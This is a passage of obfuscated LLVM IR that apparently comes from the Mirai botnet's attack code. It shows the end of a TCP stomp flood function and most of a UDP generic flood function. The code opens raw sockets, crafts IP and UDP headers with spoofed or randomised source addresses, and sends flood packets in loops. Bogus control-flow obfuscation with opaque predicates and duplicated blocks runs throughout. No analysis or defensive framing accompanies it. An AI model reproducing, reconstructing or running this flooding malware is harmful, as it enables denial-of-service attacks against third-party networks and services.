  %778 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %777, i32 0, i32 7
  store i16 %776, i16* %778, align 2
  %779 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %780 = load i32, i32* %9, align 4
  %781 = sext i32 %780 to i64
  %782 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %779, i64 %781
  %783 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %782, i32 0, i32 1
  %784 = load i32, i32* %783, align 4
  %785 = add i32 %784, 1
  store i32 %785, i32* %783, align 4
  %786 = trunc i32 %784 to i16
  %787 = call zeroext i16 @htons(i16 zeroext %786) #7
  %788 = zext i16 %787 to i32
  %789 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %790 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %789, i32 0, i32 2
  store i32 %788, i32* %790, align 4
  %791 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %792 = load i32, i32* %9, align 4
  %793 = sext i32 %792 to i64
  %794 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %791, i64 %793
  %795 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %794, i32 0, i32 2
  %796 = load i32, i32* %795, align 4
  %797 = trunc i32 %796 to i16
  %798 = call zeroext i16 @htons(i16 zeroext %797) #7
  %799 = zext i16 %798 to i32
  %800 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %801 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %800, i32 0, i32 3
  store i32 %799, i32* %801, align 4
  %802 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %803 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %802, i32 0, i32 6
  store i16 0, i16* %803, align 4
  %804 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %805 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %806 = bitcast %struct.tcphdr* %805 to i8*
  %807 = load i32, i32* %24, align 4
  %808 = sext i32 %807 to i64
  %809 = add i64 20, %808
  %810 = trunc i64 %809 to i16
  %811 = call zeroext i16 @htons(i16 zeroext %810) #7
  %812 = load i32, i32* %24, align 4
  %813 = sext i32 %812 to i64
  %814 = add i64 20, %813
  %815 = trunc i64 %814 to i32
  %816 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %804, i8* %806, i16 zeroext %811, i32 %815)
  %817 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %818 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %817, i32 0, i32 6
  store i16 %816, i16* %818, align 4
  %819 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %820 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %819, i32 0, i32 1
  %821 = load i16, i16* %820, align 2
  %822 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %823 = load i32, i32* %9, align 4
  %824 = sext i32 %823 to i64
  %825 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %822, i64 %824
  %826 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %825, i32 0, i32 0
  %827 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %826, i32 0, i32 1
  store i16 %821, i16* %827, align 2
  %828 = load i32, i32* %10, align 4
  %829 = load i8*, i8** %39, align 8
  %830 = load i32, i32* %24, align 4
  %831 = sext i32 %830 to i64
  %832 = add i64 40, %831
  %833 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %834 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %835 = load i32, i32* %9, align 4
  %836 = sext i32 %835 to i64
  %837 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %834, i64 %836
  %838 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %837, i32 0, i32 0
  %839 = bitcast %struct.sockaddr_in* %838 to %struct.sockaddr*
  store %struct.sockaddr* %839, %struct.sockaddr** %833, align 8
  %840 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %841 = load %struct.sockaddr*, %struct.sockaddr** %840, align 8
  %842 = call i64 @sendto(i32 %828, i8* %829, i64 %832, i32 16384, %struct.sockaddr* %841, i32 16)
  br label %843

; <label>:843:                                    ; preds = %771
  %844 = load i32, i32* %9, align 4
  %845 = add nsw i32 %844, 1
  store i32 %845, i32* %9, align 4
  br label %689

; <label>:846:                                    ; preds = %originalBBpart277
  br label %672

; <label>:847:                                    ; preds = %282, %originalBBpart28, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %105
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %122
  store i32 1, i32* %9, align 4
  %848 = load i32, i32* %10, align 4
  %849 = bitcast i32* %9 to i8*
  %850 = call i32 @setsockopt(i32 %848, i32 0, i32 3, i8* %849, i32 4) #6
  %851 = icmp eq i32 %850, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %143
  %852 = load i32, i32* %10, align 4
  %853 = call i32 @close(i32 %852)
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %168
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %247
  %854 = load i32, i32* %26, align 4
  %855 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %856 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %856, %struct.sockaddr** %855, align 8
  %857 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %858 = load %struct.sockaddr*, %struct.sockaddr** %857, align 8
  %859 = call i32 @connect(i32 %854, %struct.sockaddr* %858, i32 16)
  %860 = call i64 @time(i64* null) #6
  store i64 %860, i64* %31, align 8
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %307
  %861 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %862 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %861, i32 0, i32 4
  %863 = load i16, i16* %862, align 4
  %_ = shl i16 %863, 9
  %_19 = sub i16 0, %863
  %gen = add i16 %_19, 9
  %_20 = sub i16 0, %863
  %gen21 = add i16 %_20, 9
  %864 = lshr i16 %863, 9
  %_22 = shl i16 %864, 1
  %_23 = sub i16 0, %864
  %gen24 = add i16 %_23, 1
  %_25 = sub i16 %864, 1
  %gen26 = mul i16 %_25, 1
  %_27 = sub i16 %864, 1
  %gen28 = mul i16 %_27, 1
  %_29 = sub i16 0, %864
  %gen30 = add i16 %_29, 1
  %_31 = shl i16 %864, 1
  %865 = and i16 %864, 1
  %866 = zext i16 %865 to i32
  %867 = icmp ne i32 %866, 0
  br label %originalBB18

originalBB35alteredBB:                            ; preds = %originalBB35, %556
  %868 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %869 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %868, i32 0, i32 4
  %870 = load i16, i16* %869, align 4
  %_36 = shl i16 %870, 8
  %_37 = shl i16 %870, 8
  %871 = lshr i16 %870, 8
  %_38 = shl i16 %871, 1
  %_39 = sub i16 0, %871
  %gen40 = add i16 %_39, 1
  %_41 = sub i16 0, %871
  %gen42 = add i16 %_41, 1
  %872 = and i16 %871, 1
  %873 = zext i16 %872 to i32
  %874 = icmp ne i32 %873, 0
  br label %originalBB35

originalBB46alteredBB:                            ; preds = %originalBB46, %580
  %875 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %876 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %875, i32 0, i32 4
  %877 = load i16, i16* %876, align 4
  %_47 = shl i16 %877, 10
  %_48 = sub i16 0, %877
  %gen49 = add i16 %_48, 10
  %878 = lshr i16 %877, 10
  %_50 = sub i16 %878, 1
  %gen51 = mul i16 %_50, 1
  %_52 = sub i16 0, %878
  %gen53 = add i16 %_52, 1
  %_54 = sub i16 %878, 1
  %gen55 = mul i16 %_54, 1
  %879 = and i16 %878, 1
  %880 = zext i16 %879 to i32
  %881 = icmp ne i32 %880, 0
  br label %originalBB46

originalBB59alteredBB:                            ; preds = %originalBB59, %615
  %882 = load i32, i32* %26, align 4
  %883 = call i32 @close(i32 %882)
  br label %originalBB59

originalBB63alteredBB:                            ; preds = %originalBB63, %634
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %651
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %672
  store i32 0, i32* %9, align 4
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %689
  %884 = load i32, i32* %9, align 4
  %885 = load i8, i8* %5, align 1
  %886 = zext i8 %885 to i32
  %887 = icmp slt i32 %884, %886
  br label %originalBB75

originalBB79alteredBB:                            ; preds = %originalBB79, %710
  %888 = load i8**, i8*** %12, align 8
  %889 = load i32, i32* %9, align 4
  %890 = sext i32 %889 to i64
  %891 = getelementptr inbounds i8*, i8** %888, i64 %890
  %892 = load i8*, i8** %891, align 8
  store i8* %892, i8** %39, align 8
  %893 = load i8*, i8** %39, align 8
  %894 = bitcast i8* %893 to %struct.iphdr*
  store %struct.iphdr* %894, %struct.iphdr** %40, align 8
  %895 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %896 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %895, i64 1
  %897 = bitcast %struct.iphdr* %896 to %struct.tcphdr*
  store %struct.tcphdr* %897, %struct.tcphdr** %41, align 8
  %898 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %899 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %898, i64 1
  %900 = bitcast %struct.tcphdr* %899 to i8*
  store i8* %900, i8** %42, align 8
  %901 = load i16, i16* %14, align 2
  %902 = zext i16 %901 to i32
  %903 = icmp eq i32 %902, 65535
  br label %originalBB79

originalBB83alteredBB:                            ; preds = %originalBB83, %743
  %904 = call i32 @rand_next()
  %_84 = sub i32 0, %904
  %gen85 = add i32 %_84, 65535
  %_86 = shl i32 %904, 65535
  %_87 = sub i32 0, %904
  %gen88 = add i32 %_87, 65535
  %905 = and i32 %904, 65535
  %906 = trunc i32 %905 to i16
  %907 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %908 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %907, i32 0, i32 3
  store i16 %906, i16* %908, align 4
  br label %originalBB83
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpgeneric(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i32, align 4
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 8) #6
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 2, i32 0)
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %12, align 1
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 3, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 4, i32 64)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 5, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 6, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %16, align 2
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 7, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %17, align 2
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 0, i32 512)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 1, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %19, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = load i32, i32* @LOCAL_ADDR, align 4
  %67 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 25, i32 %66)
  store i32 %67, i32* %20, align 4
  %68 = load i16, i16* %18, align 2
  %69 = zext i16 %68 to i32
  %70 = icmp sgt i32 %69, 1460
  br i1 %70, label %71, label %72

; <label>:71:                                     ; preds = %4
  store i16 1460, i16* %18, align 2
  br label %72

; <label>:72:                                     ; preds = %71, %4
  %73 = load i32, i32* @x.33
  %74 = load i32, i32* @y.34
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %72
  %81 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %81, i32* %10, align 4
  %82 = icmp eq i32 %81, -1
  %83 = load i32, i32* @x.33
  %84 = load i32, i32* @y.34
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %82, label %91, label %108

; <label>:91:                                     ; preds = %originalBBpart2
  %92 = load i32, i32* @x.33
  %93 = load i32, i32* @y.34
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %91
  %100 = load i32, i32* @x.33
  %101 = load i32, i32* @y.34
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %472

; <label>:108:                                    ; preds = %originalBBpart2
  store i32 1, i32* %9, align 4
  %109 = load i32, i32* %10, align 4
  %110 = bitcast i32* %9 to i8*
  %111 = call i32 @setsockopt(i32 %109, i32 0, i32 3, i8* %110, i32 4) #6
  %112 = icmp eq i32 %111, -1
  br i1 %112, label %113, label %116

; <label>:113:                                    ; preds = %108
  %114 = load i32, i32* %10, align 4
  %115 = call i32 @close(i32 %114)
  br label %472

; <label>:116:                                    ; preds = %108
  %117 = load i32, i32* @x.33
  %118 = load i32, i32* @y.34
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %116
  store i32 0, i32* %9, align 4
  %125 = load i32, i32* @x.33
  %126 = load i32, i32* @y.34
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %133

; <label>:133:                                    ; preds = %247, %originalBBpart28
  %134 = load i32, i32* @x.33
  %135 = load i32, i32* @y.34
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %133
  %142 = load i32, i32* %9, align 4
  %143 = load i8, i8* %5, align 1
  %144 = zext i8 %143 to i32
  %145 = icmp slt i32 %142, %144
  %146 = load i32, i32* @x.33
  %147 = load i32, i32* @y.34
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %145, label %154, label %250

; <label>:154:                                    ; preds = %originalBBpart212
  %155 = load i32, i32* @x.33
  %156 = load i32, i32* @y.34
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %154
  %163 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %164 = load i8**, i8*** %11, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds i8*, i8** %164, i64 %166
  store i8* %163, i8** %167, align 8
  %168 = load i8**, i8*** %11, align 8
  %169 = load i32, i32* %9, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds i8*, i8** %168, i64 %170
  %172 = load i8*, i8** %171, align 8
  %173 = bitcast i8* %172 to %struct.iphdr*
  store %struct.iphdr* %173, %struct.iphdr** %21, align 8
  %174 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i64 1
  %176 = bitcast %struct.iphdr* %175 to %struct.udphdr*
  store %struct.udphdr* %176, %struct.udphdr** %22, align 8
  %177 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %178 = bitcast %struct.iphdr* %177 to i8*
  %179 = load i8, i8* %178, align 4
  %180 = and i8 %179, 15
  %181 = or i8 %180, 64
  store i8 %181, i8* %178, align 4
  %182 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %183 = bitcast %struct.iphdr* %182 to i8*
  %184 = load i8, i8* %183, align 4
  %185 = and i8 %184, -16
  %186 = or i8 %185, 5
  store i8 %186, i8* %183, align 4
  %187 = load i8, i8* %12, align 1
  %188 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 1
  store i8 %187, i8* %189, align 1
  %190 = load i16, i16* %18, align 2
  %191 = zext i16 %190 to i64
  %192 = add i64 28, %191
  %193 = trunc i64 %192 to i16
  %194 = call zeroext i16 @htons(i16 zeroext %193) #7
  %195 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %196 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %195, i32 0, i32 2
  store i16 %194, i16* %196, align 2
  %197 = load i16, i16* %13, align 2
  %198 = call zeroext i16 @htons(i16 zeroext %197) #7
  %199 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 3
  store i16 %198, i16* %200, align 4
  %201 = load i8, i8* %14, align 1
  %202 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %202, i32 0, i32 5
  store i8 %201, i8* %203, align 4
  %204 = load i8, i8* %15, align 1
  %205 = icmp ne i8 %204, 0
  %206 = load i32, i32* @x.33
  %207 = load i32, i32* @y.34
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBBpart242, label %originalBB14alteredBB

originalBBpart242:                                ; preds = %originalBB14
  br i1 %205, label %214, label %218

; <label>:214:                                    ; preds = %originalBBpart242
  %215 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %216 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %217 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %216, i32 0, i32 4
  store i16 %215, i16* %217, align 2
  br label %218

; <label>:218:                                    ; preds = %214, %originalBBpart242
  %219 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %220 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %219, i32 0, i32 6
  store i8 17, i8* %220, align 1
  %221 = load i32, i32* %20, align 4
  %222 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %223 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %222, i32 0, i32 8
  store i32 %221, i32* %223, align 4
  %224 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %225 = load i32, i32* %9, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %224, i64 %226
  %228 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %227, i32 0, i32 1
  %229 = load i32, i32* %228, align 4
  %230 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %231 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %230, i32 0, i32 9
  store i32 %229, i32* %231, align 4
  %232 = load i16, i16* %16, align 2
  %233 = call zeroext i16 @htons(i16 zeroext %232) #7
  %234 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %235 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %234, i32 0, i32 0
  store i16 %233, i16* %235, align 2
  %236 = load i16, i16* %17, align 2
  %237 = call zeroext i16 @htons(i16 zeroext %236) #7
  %238 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %239 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %238, i32 0, i32 1
  store i16 %237, i16* %239, align 2
  %240 = load i16, i16* %18, align 2
  %241 = zext i16 %240 to i64
  %242 = add i64 8, %241
  %243 = trunc i64 %242 to i16
  %244 = call zeroext i16 @htons(i16 zeroext %243) #7
  %245 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %246 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %245, i32 0, i32 2
  store i16 %244, i16* %246, align 2
  br label %247

; <label>:247:                                    ; preds = %218
  %248 = load i32, i32* %9, align 4
  %249 = add nsw i32 %248, 1
  store i32 %249, i32* %9, align 4
  br label %133

; <label>:250:                                    ; preds = %originalBBpart212
  br label %251

; <label>:251:                                    ; preds = %originalBBpart262, %250
  store i32 0, i32* %9, align 4
  br label %252

; <label>:252:                                    ; preds = %452, %251
  %253 = load i32, i32* %9, align 4
  %254 = load i8, i8* %5, align 1
  %255 = zext i8 %254 to i32
  %256 = icmp slt i32 %253, %255
  br i1 %256, label %257, label %455

; <label>:257:                                    ; preds = %252
  %258 = load i32, i32* @x.33
  %259 = load i32, i32* @y.34
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %257
  %266 = load i8**, i8*** %11, align 8
  %267 = load i32, i32* %9, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds i8*, i8** %266, i64 %268
  %270 = load i8*, i8** %269, align 8
  store i8* %270, i8** %23, align 8
  %271 = load i8*, i8** %23, align 8
  %272 = bitcast i8* %271 to %struct.iphdr*
  store %struct.iphdr* %272, %struct.iphdr** %24, align 8
  %273 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %274 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %273, i64 1
  %275 = bitcast %struct.iphdr* %274 to %struct.udphdr*
  store %struct.udphdr* %275, %struct.udphdr** %25, align 8
  %276 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %277 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %276, i64 1
  %278 = bitcast %struct.udphdr* %277 to i8*
  store i8* %278, i8** %26, align 8
  %279 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %280 = load i32, i32* %9, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %279, i64 %281
  %283 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %282, i32 0, i32 2
  %284 = load i8, i8* %283, align 4
  %285 = zext i8 %284 to i32
  %286 = icmp slt i32 %285, 32
  %287 = load i32, i32* @x.33
  %288 = load i32, i32* @y.34
  %289 = sub i32 %287, 1
  %290 = mul i32 %287, %289
  %291 = urem i32 %290, 2
  %292 = icmp eq i32 %291, 0
  %293 = icmp slt i32 %288, 10
  %294 = or i1 %292, %293
  br i1 %294, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br i1 %286, label %295, label %316

; <label>:295:                                    ; preds = %originalBBpart246
  %296 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %297 = load i32, i32* %9, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %296, i64 %298
  %300 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %299, i32 0, i32 1
  %301 = load i32, i32* %300, align 4
  %302 = call i32 @ntohl(i32 %301) #7
  %303 = call i32 @rand_next()
  %304 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %305 = load i32, i32* %9, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %304, i64 %306
  %308 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %307, i32 0, i32 2
  %309 = load i8, i8* %308, align 4
  %310 = zext i8 %309 to i32
  %311 = lshr i32 %303, %310
  %312 = add i32 %302, %311
  %313 = call i32 @htonl(i32 %312) #7
  %314 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %315 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %314, i32 0, i32 9
  store i32 %313, i32* %315, align 4
  br label %316

; <label>:316:                                    ; preds = %295, %originalBBpart246
  %317 = load i32, i32* @x.33
  %318 = load i32, i32* @y.34
  %319 = sub i32 %317, 1
  %320 = mul i32 %317, %319
  %321 = urem i32 %320, 2
  %322 = icmp eq i32 %321, 0
  %323 = icmp slt i32 %318, 10
  %324 = or i1 %322, %323
  br i1 %324, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %316
  %325 = load i32, i32* %20, align 4
  %326 = icmp eq i32 %325, -1
  %327 = load i32, i32* @x.33
  %328 = load i32, i32* @y.34
  %329 = sub i32 %327, 1
  %330 = mul i32 %327, %329
  %331 = urem i32 %330, 2
  %332 = icmp eq i32 %331, 0
  %333 = icmp slt i32 %328, 10
  %334 = or i1 %332, %333
  br i1 %334, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br i1 %326, label %335, label %339

; <label>:335:                                    ; preds = %originalBBpart250
  %336 = call i32 @rand_next()
  %337 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %338 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %337, i32 0, i32 8
  store i32 %336, i32* %338, align 4
  br label %339

; <label>:339:                                    ; preds = %335, %originalBBpart250
  %340 = load i16, i16* %13, align 2
  %341 = zext i16 %340 to i32
  %342 = icmp eq i32 %341, 65535
  br i1 %342, label %343, label %364

; <label>:343:                                    ; preds = %339
  %344 = load i32, i32* @x.33
  %345 = load i32, i32* @y.34
  %346 = sub i32 %344, 1
  %347 = mul i32 %344, %346
